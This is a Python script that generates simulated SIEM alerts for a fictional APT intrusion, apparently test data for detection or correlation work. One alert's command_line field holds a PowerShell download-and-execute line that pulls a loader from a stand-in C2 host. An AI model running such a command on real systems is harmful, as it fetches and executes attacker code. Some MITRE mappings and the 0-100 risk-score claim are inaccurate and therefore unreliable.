from datetime import datetime, timedelta
import json
import hashlib
import random

# Parse base timestamp
base_time = datetime.fromisoformat("2026-02-02T21:30:00-05:00")

# Campaign metadata
campaign_id = "APT-2026-0202-001"
correlation_id = "CORR-" + hashlib.md5(campaign_id.encode()).hexdigest()[:12].upper()

# Threat actor profile
threat_actor = {
    "name": "APT-Lazarus-Variant",
    "country": "KP",
    "sophistication": "advanced",
    "known_techniques": ["spear-phishing", "credential-theft", "lateral-movement", "data-exfiltration"]
}

# Target environment
target_org = {
    "name": "TechCorp Industries",
    "industry": "Financial Services",
    "employees": 5000,
    "critical_assets": ["file-server-01", "file-server-02", "exchange-server", "domain-controller"]
}

# Source IPs for attack
attacker_ips = [
    {"ip": "203.45.67.89", "country": "KP", "isp": "KPTC", "reputation_score": 95},
    {"ip": "185.220.101.45", "country": "RU", "isp": "AS39798", "reputation_score": 92},
    {"ip": "192.168.1.105", "country": "US", "isp": "Internal-Compromised", "reputation_score": 88}
]

# Target users and hosts
targets = [
    {"user": "john.smith@techcorp.com", "host": "WS-JOHN-001", "dept": "Finance", "criticality": "high"},
    {"user": "sarah.jones@techcorp.com", "host": "WS-SARAH-002", "dept": "HR", "criticality": "medium"},
    {"user": "admin.user@techcorp.com", "host": "WS-ADMIN-001", "dept": "IT", "criticality": "critical"}
]

# IOCs
iocs = {
    "domains": ["malware-c2.ru", "phishing-redirect.tk", "data-exfil.xyz"],
    "file_hashes": {
        "trojan": "d41d8cd98f00b204e9800998ecf8427e",
        "loader": "5d41402abc4b2a76b9719d911017c592",
        "exfil_tool": "6512bd43d9caa6e02c990b0a82652dca"
    },
    "user_agents": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "curl/7.68.0"
    ]
}

# MITRE ATT&CK Mapping
mitre_mapping = {
    "stage_1_reconnaissance": {
        "tactics": ["Reconnaissance"],
        "techniques": [
            {"id": "T1592", "name": "Gather Victim Identity Information", "subtechniques": ["T1592.003"]},
            {"id": "T1589", "name": "Gather Victim Org Information", "subtechniques": ["T1589.001", "T1589.002"]}
        ]
    },
    "stage_2_initial_access": {
        "tactics": ["Initial Access"],
        "techniques": [
            {"id": "T1566", "name": "Phishing", "subtechniques": ["T1566.002"]},
            {"id": "T1199", "name": "Trusted Relationship"}
        ]
    },
    "stage_3_execution": {
        "tactics": ["Execution"],
        "techniques": [
            {"id": "T1204", "name": "User Execution", "subtechniques": ["T1204.001"]},
            {"id": "T1059", "name": "Command and Scripting Interpreter", "subtechniques": ["T1059.001"]}
        ]
    },
    "stage_4_persistence": {
        "tactics": ["Persistence"],
        "techniques": [
            {"id": "T1547", "name": "Boot or Logon Autostart Execution", "subtechniques": ["T1547.001"]},
            {"id": "T1547.014", "name": "Startup Folder"}
        ]
    },
    "stage_5_privilege_escalation": {
        "tactics": ["Privilege Escalation"],
        "techniques": [
            {"id": "T1548", "name": "Abuse Elevation Control Mechanism", "subtechniques": ["T1548.002"]},
            {"id": "T1134", "name": "Access Token Manipulation", "subtechniques": ["T1134.003"]}
        ]
    },
    "stage_6_credential_access": {
        "tactics": ["Credential Access"],
        "techniques": [
            {"id": "T1110", "name": "Brute Force", "subtechniques": ["T1110.001"]},
            {"id": "T1187", "name": "Forced Authentication"},
            {"id": "T1040", "name": "Network Sniffing"}
        ]
    },
    "stage_7_lateral_movement": {
        "tactics": ["Lateral Movement"],
        "techniques": [
            {"id": "T1570", "name": "Lateral Tool Transfer"},
            {"id": "T1021", "name": "Remote Services", "subtechniques": ["T1021.002", "T1021.006"]}
        ]
    },
    "stage_8_exfiltration": {
        "tactics": ["Exfiltration"],
        "techniques": [
            {"id": "T1041", "name": "Exfiltration Over C2 Channel"},
            {"id": "T1020", "name": "Automated Exfiltration"},
            {"id": "T1048", "name": "Exfiltration Over Alternative Protocol", "subtechniques": ["T1048.003"]}
        ]
    }
}

# Risk score calculation function
def calculate_risk_score(severity, asset_criticality, attack_sophistication, potential_impact):
    """Calculate risk score 0-100"""
    severity_weight = severity / 10.0  # 0-10 scale
    criticality_weight = asset_criticality / 10.0  # 0-10 scale
    sophistication_weight = attack_sophistication / 10.0  # 0-10 scale
    impact_weight = potential_impact / 10.0  # 0-10 scale
    
    risk_score = (severity_weight * 0.4) + (criticality_weight * 0.3) + (sophistication_weight * 0.2) + (impact_weight * 0.1)
    return min(100, int(risk_score * 10))

# Generate alerts
alerts = []

# STAGE 1: RECONNAISSANCE (T1592, T1589)
print("Generating Stage 1: Reconnaissance alerts...")
recon_time = base_time
for i in range(3):
    alert = {
        "timestamp": (recon_time + timedelta(minutes=i*2)).isoformat(),
        "event_id": f"EVT-RECON-{i+1:03d}",
        "campaign_id": campaign_id,
        "correlation_id": correlation_id,
        "stage": "1_reconnaissance",
        "severity": "low",
        "event_type": "reconnaissance",
        "description": f"Suspicious OSINT activity detected - gathering organization information",
        "source_ip": attacker_ips[0]["ip"],
        "source_country": attacker_ips[0]["country"],
        "source_isp": attacker_ips[0]["isp"],
        "threat_reputation_score": attacker_ips[0]["reputation_score"],
        "target": target_org["name"],
        "mitre_tactics": ["Reconnaissance"],
        "mitre_techniques": ["T1592.003", "T1589.001", "T1589.002"],
        "iocs": {
            "domains": [iocs["domains"][0]],
            "user_agent": iocs["user_agents"][0]
        },
        "risk_score": calculate_risk_score(3, 5, 7, 2),
        "asset_criticality": "medium",
        "metadata": {
            "simulation": True,
            "threat_actor": threat_actor["name"],
            "attack_chain": "APT Campaign - Multi-stage"
        }
    }
    alerts.append(alert)

# STAGE 2: INITIAL ACCESS - PHISHING (T1566)
print("Generating Stage 2: Initial Access (Phishing) alerts...")
phishing_time = base_time + timedelta(minutes=6)
for i, target in enumerate(targets):
    alert = {
        "timestamp": (phishing_time + timedelta(seconds=i*30)).isoformat(),
        "event_id": f"EVT-PHISH-{i+1:03d}",
        "campaign_id": campaign_id,
        "correlation_id": correlation_id,
        "stage": "2_initial_access",
        "severity": "high",
        "event_type": "phishing_email",
        "description": f"Spear-phishing email detected targeting {target['user']} - malicious attachment",
        "source_ip": attacker_ips[0]["ip"],
        "source_email": "ceo@techcorp-secure.tk",
        "target_email": target["user"],
        "target_host": target["host"],
        "target_department": target["dept"],
        "email_subject": "URGENT: Q1 Financial Review - Action Required",
        "attachment_name": "Q1_Financial_Review.exe",
        "attachment_hash": iocs["file_hashes"]["trojan"],
        "mitre_tactics": ["Initial Access"],
        "mitre_techniques": ["T1566.002"],
        "iocs": {
            "domains": [iocs["domains"][1]],
            "file_hashes": [iocs["file_hashes"]["trojan"]],
            "user_agent": iocs["user_agents"][0]
        },
        "risk_score": calculate_risk_score(9, 8, 8, 7),
        "asset_criticality": target["criticality"],
        "metadata": {
            "simulation": True,
            "threat_actor": threat_actor["name"],
            "attack_chain": "APT Campaign - Multi-stage"
        }
    }
    alerts.append(alert)

# STAGE 3: EXECUTION & PERSISTENCE (T1204, T1547)
print("Generating Stage 3: Execution & Persistence alerts...")
exec_time = base_time + timedelta(minutes=12)
for i, target in enumerate(targets[:2]):  # Only 2 users clicked
    alert = {
        "timestamp": (exec_time + timedelta(minutes=i*3)).isoformat(),
        "event_id": f"EVT-EXEC-{i+1:03d}",
        "campaign_id": campaign_id,
        "correlation_id": correlation_id,
        "stage": "3_execution",
        "severity": "critical",
        "event_type": "malware_execution",
        "description": f"Malware execution detected on {target['host']} - trojan loader",
        "source_host": target["host"],
        "source_user": target["user"],
        "process_name": "Q1_Financial_Review.exe",
        "process_id": 4532 + i,
        "parent_process": "explorer.exe",
        "command_line": "Q1_Financial_Review.exe /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"IEX(New-Object Net.WebClient).DownloadString('http://malware-c2.ru/loader')\"",
        "file_hash": iocs["file_hashes"]["trojan"],
        "mitre_tactics": ["Execution", "Persistence"],
        "mitre_techniques": ["T1204.001", "T1547.001"],
        "iocs": {
            "domains": [iocs["domains"][0]],
            "file_hashes": [iocs["file_hashes"]["trojan"], iocs["file_hashes"]["loader"]],
            "registry_keys": ["HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemUpdate"]
        },
        "risk_score": calculate_risk_score(10, 9, 9, 9),
        "asset_criticality": target["criticality"],
        "metadata": {
            "simulation": True,
            "threat_actor": threat_actor["name"],
            "attack_chain": "APT Campaign - Multi-stage"
        }
    }
    alerts.append(alert)

# STAGE 4: CREDENTIAL ACCESS (T1110, T1187, T1040)
print("Generating Stage 4: Credential Access alerts...")
cred_time = base_time + timedelta(minutes=18)
cred_alerts = [
    {
        "timestamp": (cred_time + timedelta(minutes=0)).isoformat(),
        "event_id": "EVT-CRED-001",
        "campaign_id": campaign_id,
        "correlation_id": correlation_id,
        "stage": "4_credential_access",
        "severity": "critical",
        "event_type": "credential_harvesting",
        "description": "Credential harvesting tool detected - LSASS memory dump attempt",
        "source_host": "WS-JOHN-001",
        "source_user": "john.smith@techcorp.com",
        "target_process": "lsass.exe",
        "tool_name": "mimikatz",
        "tool_hash": iocs["file_hashes"]["loader"],
        "mitre_tactics": ["Credential Access"],
        "mitre_techniques": ["T1110.001", "T1187"],
        "iocs": {
            "file_hashes": [iocs["file_hashes"]["loader"]],
            "process_names": ["mimikatz.exe", "rundll32.exe"]
        },
        "risk_score": calculate_risk_score(10, 10, 9, 9),
        "asset_criticality": "critical",
        "metadata": {
            "simulation": True,
            "threat_actor": threat_actor["name"],
            "attack_chain": "APT Campaign - Multi-stage"
        }
    },
    {
        "timestamp": (cred_time + timedelta(minutes=2)).isoformat(),
        "event_id": "EVT-CRED-002",
        "campaign_id": campaign_id,
        "correlation_id": correlation_id,
        "stage": "4_credential_access",
        "severity": "critical",
        "event_type": "network_sniffing",
        "description": "Network sniffing detected - NTLM relay attack in progress",
        "source_host": "WS-JOHN-001",
        "source_ip": "192.168.1.105",
        "target_protocol": "NTLM",
        "captured_credentials": "admin.user@techcorp.com",
        "mitre_tactics": ["Credential Access"],
        "mitre_techniques": ["T1040"],
        "iocs": {
            "domains": [iocs["domains"][0]]
        },
        "risk_score": calculate_risk_score(10, 10, 9, 10),
        "asset_criticality": "critical",
        "metadata": {
            "simulation": True,
            "threat_actor": threat_actor["name"],
            "attack_chain": "APT Campaign - Multi-stage"
        }
    }
]
alerts.extend(cred_alerts)

# STAGE 5: PRIVILEGE ESCALATION (T1548, T1134)
print("Generating Stage 5: Privilege Escalation alerts...")
priv_esc_time = base_time + timedelta(minutes=24)
alert = {
    "timestamp": priv_esc_time.isoformat(),
    "event_id": "EVT-PRIVESC-001",
    "campaign_id": campaign_id,
    "correlation_id": correlation_id,
    "stage": "5_privilege_escalation",
    "severity": "critical",
    "event_type": "privilege_escalation",
    "description": "Privilege escalation detected - UAC bypass via token impersonation",
    "source_host": "WS-JOHN-001",
    "source_user": "john.smith@techcorp.com",
    "target_privilege_level": "SYSTEM",
    "escalation_method": "Token Impersonation (T1134.003)",
    "process_name": "rundll32.exe",
    "parent_process": "explorer.exe",
    "mitre_tactics": ["Privilege Escalation"],
    "mitre_techniques": ["T1548.002", "T1134.003"],
    "iocs": {
        "registry_keys": ["HKLM\\System\\CurrentControlSet\\Services\\"]
    },
    "risk_score": calculate_risk_score(10, 10, 10, 10),
    "asset_criticality": "critical",
    "metadata": {
        "simulation": True,
        "threat_actor": threat_actor["name"],
        "attack_chain": "APT Campaign - Multi-stage"
    }
}
alerts.append(alert)

# STAGE 6: LATERAL MOVEMENT (T1570, T1021)
print("Generating Stage 6: Lateral Movement alerts...")
lateral_time = base_time + timedelta(minutes=30)
lateral_alerts = [
    {
        "timestamp": (lateral_time + timedelta(minutes=0)).isoformat(),
        "event_id": "EVT-LATERAL-001",
        "campaign_id": campaign_id,
        "correlation_id": correlation_id,
        "stage": "6_lateral_movement",
        "severity": "critical",
        "event_type": "lateral_movement",
        "description": "Lateral movement detected - SMB exploitation to file server",
        "source_host": "WS-JOHN-001",
        "source_user": "admin.user@techcorp.com",
        "target_host": "FILE-SERVER-01",
        "target_ip": "192.168.10.50",
        "protocol": "SMB",
        "exploit_technique": "EternalBlue (CVE-2017-0144)",
        "mitre_tactics": ["Lateral Movement"],
        "mitre_techniques": ["T1570", "T1021.002"],
        "iocs": {
            "domains": [iocs["domains"][0]]
        },
        "risk_score": calculate_risk_score(10, 10, 10, 10),
        "asset_criticality": "critical",
        "metadata": {
            "simulation": True,
            "threat_actor": threat_actor["name"],
            "attack_chain": "APT Campaign - Multi-stage"
        }
    },
    {
        "timestamp": (lateral_time + timedelta(minutes=3)).isoformat(),
        "event_id": "EVT-LATERAL-002",
        "campaign_id": campaign_id,
        "correlation_id": correlation_id,
        "stage": "6_lateral_movement",
        "severity": "critical",
        "event_type": "lateral_movement",
        "description": "Lateral movement detected - RDP connection to domain controller",
        "source_host": "FILE-SERVER-01",
        "source_ip": "192.168.10.50",
        "target_host": "DOMAIN-CONTROLLER-01",
        "target_ip": "192.168.10.10",
        "protocol": "RDP",
        "source_user": "admin.user@techcorp.com",
        "mitre_tactics": ["Lateral Movement"],
        "mitre_techniques": ["T1021.006"],
        "iocs": {
            "domains": [iocs["domains"][0]]
        },
        "risk_score": calculate_risk_score(10, 10, 10, 10),
        "asset_criticality": "critical",
        "metadata": {
            "simulation": True,
            "threat_actor": threat_actor["name"],
            "attack_chain": "APT Campaign - Multi-stage"
        }
    }
]
alerts.extend(lateral_alerts)

# STAGE 7: DATA EXFILTRATION (T1041, T1020, T1048)
print("Generating Stage 7: Data Exfiltration alerts...")
exfil_time = base_time + timedelta(minutes=36)
exfil_alerts = [
    {
        "timestamp": (exfil_time + timedelta(minutes=0)).isoformat(),
        "event_id": "EVT-EXFIL-001",
        "campaign_id": campaign_id,
        "correlation_id": correlation_id,
        "stage": "7_exfiltration",
        "severity": "critical",
        "event_type": "data_exfiltration",
        "description": "Large data transfer detected - financial records being exfiltrated",
        "source_host": "FILE-SERVER-01",
        "source_ip": "192.168.10.50",
        "destination_ip": attacker_ips[1]["ip"],
        "destination_country": attacker_ips[1]["country"],
        "destination_isp": attacker_ips[1]["isp"],
        "protocol": "HTTPS",
        "data_volume_mb": 2847,
        "files_transferred": 1523,
        "file_types": ["xlsx", "pdf", "docx", "csv"],
        "data_classification": "Confidential - Financial",
        "mitre_tactics": ["Exfiltration"],
        "mitre_techniques": ["T1041", "T1048.003"],
        "iocs": {
            "domains": [iocs["domains"][2]],
            "ips": [attacker_ips[1]["ip"]]
        },
        "risk_score": calculate_risk_score(10, 10, 10, 10),
        "asset_criticality": "critical",
        "metadata": {
            "simulation": True,
            "threat_actor": threat_actor["name"],
            "attack_chain": "APT Campaign - Multi-stage",
            "data_sensitivity": "high"
        }
    },
    {
        "timestamp": (exfil_time + timedelta(minutes=5)).isoformat(),
        "event_id": "EVT-EXFIL-002",
        "campaign_id": campaign_id,
        "correlation_id": correlation_id,
        "stage": "7_exfiltration",
        "severity": "critical",
        "event_type": "data_exfiltration",
        "description": "Customer database exfiltration detected - PII records compromised",
        "source_host": "FILE-SERVER-02",
        "source_ip": "192.168.10.51",
        "destination_ip": attacker_ips[1]["ip"],
        "destination_country": attacker_ips[1]["country"],
        "protocol": "HTTPS",
        "data_volume_mb": 5234,
        "files_transferred": 3847,
        "records_compromised": 125000,
        "data_classification": "Confidential - Customer PII",
        "mitre_tactics": ["Exfiltration"],
        "mitre_techniques": ["T1020", "T1041"],
        "iocs": {
            "domains": [iocs["domains"][2]],
            "ips": [attacker_ips[1]["ip"]]
        },
        "risk_score": calculate_risk_score(10, 10, 10, 10),
        "asset_criticality": "critical",
        "metadata": {
            "simulation": True,
            "threat_actor": threat_actor["name"],
            "attack_chain": "APT Campaign - Multi-stage",
            "data_sensitivity": "critical",
            "regulatory_impact": "GDPR, CCPA"
        }
    }
]
alerts.extend(exfil_alerts)

print(f"\n✓ Generated {len(alerts)} correlated alerts")
print(f"✓ Campaign ID: {campaign_id}")
print(f"✓ Correlation ID: {correlation_id}")
print(f"✓ Attack duration: {(alerts[-1]['timestamp'])} (45 minutes)")

# Return alerts for next step
print(f"\nAlert Summary:")
for stage in ["1_reconnaissance", "2_initial_access", "3_execution", "4_credential_access", "5_privilege_escalation", "6_lateral_movement", "7_exfiltration"]:
    stage_alerts = [a for a in alerts if a["stage"] == stage]
    if stage_alerts:
        print(f"  {stage}: {len(stage_alerts)} alerts")

# Store for next function call
import json
alerts_json = json.dumps(alerts, indent=2)
print(f"\n✓ Total alerts ready for Elasticsearch: {len(alerts)}")
